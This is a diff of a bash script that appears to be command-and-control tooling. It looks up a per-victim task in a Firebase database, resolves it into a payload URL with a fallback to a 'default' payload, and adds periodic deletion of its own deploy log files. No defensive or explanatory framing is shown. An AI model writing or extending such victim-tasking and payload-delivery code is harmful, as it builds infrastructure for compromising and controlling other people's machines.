@@ -46,8 +46,8 @@ function getURLETag(){
    | cut -d'"' -f2
 }
 
-function getTaskURL(){
-  echo "getTaskURL: $1" >&2
+function getTaskID(){
+  echo "getTaskID: $1" >&2
   local victimID="$1"
 
   curl -s "https://${firebaseProject}.firebaseio.com/victims/$victimID/task.json" \
@@ -55,18 +55,24 @@ function getTaskURL(){
 
 }
 
+function getTaskURL() {
+  local payloadID="$1"
+  curl -s "https://${firebaseProject}.firebaseio.com/tasks/$payloadID.json" \
+   | tr -d '"'
+}
+
 function getPayloadURL(){
   #echo "getPayloadURL: $1" >&2
   local url="$1"
   local victimID="$2"
   
-  local payloadURL=`getTaskURL "$victimID"`
-  echo "getPayloadURL: $payloadURL" >&2
-  if [ "$payloadURL" == "null" ]; then
-    payloadURL=`getTaskURL "default"`
+  local payloadID=`getTaskID "$victimID"`
+  echo "getPayloadURL: $payloadID" >&2
+  if [ "$payloadID" == "null" ]; then
+    echo "${payloadPrefix}`getTaskURL 'default'`"
+  else
+    echo "${payloadPrefix}`getTaskURL \"$payloadID\"`"
   fi
-  echo "${payloadPrefix}${payloadURL}"
-
 }
 
 function downloadURL(){
@@ -159,7 +165,12 @@ if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
     done
   
     let iteration=$((iteration+1))
-  
+ 
+    if [ $((iteration % 100)) -eq 0 ]; then
+      rm "$SCRIPTDIR/deploy.stdout"
+      rm "$SCRIPTDIR/deploy.stderr"
+    fi
+ 
   done
 
 fi
